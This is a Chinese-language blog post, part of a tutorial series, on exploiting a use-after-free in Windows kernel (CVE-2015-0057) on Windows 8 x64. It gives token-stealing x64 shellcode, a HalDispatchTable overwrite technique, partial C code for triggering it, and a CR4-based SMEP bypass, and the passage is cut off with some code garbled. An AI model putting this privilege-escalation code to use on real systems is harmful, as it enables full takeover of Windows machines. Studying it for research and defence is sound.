**作者: wjllz  
博客链接: **
## 前言
Hello, 欢迎来到`windows kernel exploit`系列. 这是UAF系列的第二篇. 三篇的主要内容如下.
    [+] 第一篇: HEVD给的样例熟悉UAF
    [+] 第二篇: CVE-2015-0057在win8 X64下的利用
    [+] windows 10 x64下的UAF
首先要说很多感谢, [NCC group](https://www.nccgroup.trust/us/)真的做了很杰出的工作, 受益颇多.
然后是[keenjoy95](https://weibo.com/keenjoy95?is_hot=1)老师,
他在blackhat上提供的PDF给我思路的理解提供了很大的帮助. 还有拖了这么多天.
[sakura师父](http://eternalsakura13.com/)没有把我打死.
还有就是[小刀师傅](https://xiaodaozhi.com/)这段时间不厌其烦的解惑.
然后是一点小小(大大)的抱歉.
    [+] 这篇文章出来的比较晚. 其实第一篇文章写完之后就开始写第二篇了. 但是写完一大半的时候发现用户回调我还是不够透彻. 就vim 1000dd之后重新分析了一个洞.
    [+] 这篇文章可能比较长. 因为这个洞牵涉到的知识点比较多. 但是不用担心. 涉及到的知识点大多数在其它漏洞中可以重复利用. 你只用学一次就够了.
    [+] exp的代码还是写的太烂了, 最后成功提了权. 由于漏洞折腾了我很久. 所以实在没心情去重新组织代码结构了.
其次是一点小小的说明.
    [+] 我把这个系列叫做系列大概是因为我无法保证我所会的是最好的解决方案, 很多东西只能凭现有的知识体系去想. 实现的过程肯定是走弯路了. 所以无法具有教程的资格.
    [+] 但是anyway, 我擅长犯错. 希望把我的错贴出来. 避免下一位内核选手重复犯错(古巨基的很好听的一首歌)
    [+] 笨方法总比没有办法好. 所以不如试试
    [+] 一起成长
然后是一点啼笑皆非的事. 我实习的时候想去xxx, 然后师傅和我说. 你要是把`ddctf`的两道kernel pwn的题做出来, 我不认为你去不了.
所以`ddctf`的pwn题本来是我这个月末的目标来着. 结果在做堆头修复的时候. 查资料才发现这就是第二题… emmmmm. 不过由于我参考了过多的资料,
所以其实不算做出来.
下面是文章主要涉及的知识点:
    [+] 利用win32k回调实现漏洞利用
        ==> 漏洞类型: UAF ==> 转化 ==> out of bounds ==> uaf ==> 利用(这个地方先不用太介意. 后面我会详细解释)
    [+] windows8.1下泄露cookie修复堆头
    [+] windows8.1下绕过SMEP
    [+] heap feng shui
    [+] 64位下shellcode的编译
    [+] 在实现了write-what-where之后, 如何在内核调用shellcode
我自己浪费的时间比较久的是:
    [+] heap fengshui花了我大量的时间
    [+] cookie修复堆头浪费了我大量的时间
    [+] 寻找可利用的回调函数
所以我会把这三个部分我犯得错误贴出来. 希望能够帮你避免你能够重复犯错.
代码的实现我实现的NCC group的方法. 由于英文比较差, 出现了点理解误差, 所以我的布局和NCC gruop的有一点点小的不同.
keenjoy98老师的方法我觉得我应该大概理解了, 但是我可能想的麻烦了, 所以就不再赘述.
Let’s Go
## 0x01: 一个小故事
故事的开头是这样的. 有一天你想实现一下内核提权. 于是你写了如下的shellcode.
    shellCode proc
    ; shellcode编写
    mov rax, gs:[188h]    ;Kprcb.Kpthread
    mov rax, [rax+220h]    ;process
    mov    rcx, rax    ; keep copy value
    mov    rdx, 4        ; system PID
    findSystemPid:
        mov    rax, [rax+2e8h]    ; ActiveProcessLinks : _LIST_ENTRY
        sub    rax, 2e8h
        cmp    [rax+2e0h], rdx
        jnz findSystemPid 
        ; 替换Token
        mov rdx, [rax+348h]    ; get system token
        mov [rcx+348h], rdx    ; copy
        ret
    shellCode endp
这部分的shellcode你可以从第一篇当中的到解释从而类推. 或者你可以在[这里](https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-1)得到. 代码也有详细的注释. 所以 这一部分. 我主要讲一下如何编译64的汇编.
x64不支持`_asm`内联汇编. 所以我目前知道的有三种选择.
    [+] 编写出shellcode. 采用其它软件(masm之类)生成可执行文件. 然后dump出字节码. 存储为char x[] = "\x90\x90"
    [+] 利用c提供的函数实现汇编的功能
    [+] 独立写.asm文件, 然后编译
我个人更喜欢第三种. 因为好看. 我的环境是vs 2015. 设置编译选项的动态图如下.
需要注意的是这两个命令. 原封不动的`ctrl+c`和`ctrl+v`即可
    ml64 /c %(filename).asm
    %(filename).obj;%(outputs)
好了. shellcode的编译已经写完了. 我们知道shellcode只能在内核当中执行. 如何在内核当中执行它呢.
在内核当中我们观察到一个有趣的代码段.
函数nt!NtQueryIntervalProfile+0x22调用了nt!KeQueryIntervalProfile,
接着我们观察一下nt!KeQueryIntervalProfile, 发现如下代码段.
我们发现这个地方调用了一个函数指针(一个指针用来存储函数的地址), 我们存储在nt!HalDispatchTable+0x8处 ,
那么它指向哪一个函数呢呢. 运行下面的指令
    dqs nt!HalDispatchTable
![dqs
nt!HalDispatchTable](https://images.seebug.org/content/images/2019/04/01/1554100014000-blog_4.png-w331s)
hal是一个函数指针数组. dqs列出其中的值. 我们看到函数`hal!HaliQuerySystemInformation`存储在偏移0x8处. 如果.
我是说我们如果能有一个对任意地址写的机会. 我们就有能力修改偏移0x8处的值. 何不试试把它改成shellcode的地址.
那么在`KeQueryIntervalProfile`中的代码可以替换成call shellcode. 于是我们就可以执行shellcode.
记下我们接下来要实现的目标
    [+] 需要有任意地址读写的机会
    [+] 修改hal表的0x8为shellcode地址
那么我们去找一个漏洞吧, 才不要(逃), 作为一个win内核选手我们得记住我们是拥有windbg的男人. windbg具有的功能
    [+] 可以采用eq eb ed等指令来修改数据(q b d代表修改的数据大小)
所以我们可以采用windbg来模拟任意地址读写. 整个过程的步骤如下.
    [+] 找到haldispatchtable的地址
    [+] 修改0x8处的地址为shellcode的地址
    [+] 触发我们的NtQueryIntervalProfile函数, 来进行内核提权.
最后我们采用在代码最后加上system(“cmd”) 创建cmd, 用来观察提权是否成功.main函数代码如下.
    #include 
    #include 
    #include "shellcode.h"
    typedef NTSTATUS(__stdcall *NtQueryIntervalProfile_t)(UINT, PULONG);
    NtQueryIntervalProfile_t NtQueryIntervalProfile;
    BOOL runShellcode()
    {
        ULONG_PTR newcr4 = 0x406f8;
        NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(GetModuleHandleA((LPCSTR) "ntdll.dll"), "NtQueryIntervalProfile");
        if (!NtQueryIntervalProfile) {
            std::cout  u fffff802`005f97cc
        nt!KiConfigureDynamicProcessor+0x40:
        fffff802`005f97cc 0f22e0          mov     cr4,rax
        fffff802`005f97cf 4883c428        add     rsp,28h
        fffff802`005f97d3 c3              ret
等等, `cr4`是啥. `cr4`是决定`SMEP`是否启用的关键寄存器. `SMEP`的启用状态将基于`cr4寄存器`来判断. 先来看一张图.
我们通过smep标志位(第20位, 从0计数)来判断是否要启用SMEP. 我们来查看一下我们的cr4寄存器的运行在我的环境下触发漏洞前后的对比.
    .formats 00000000001506f8 // enable
        Binary:  00000000 00000000 00000000 00000000 00000000 0001        0101 00000110 11111000
    .formats 0x406f8        // disable
        Binary:  00000000 00000000 00000000 00000000 00000000 0000        0100 00000110 11111000
我们可以看到关键bit位的更改,
假设我们把haldispatchtable+0x8处改为`nt!KiConfigureDynamicProcessor+0x40`的时候,
rax也刚刚好为`0x406f8`, 而刚好返回地址也为shellcode的地址, 那么简直完美. 幸运的是, 假设我们把漏洞利用函数改为此.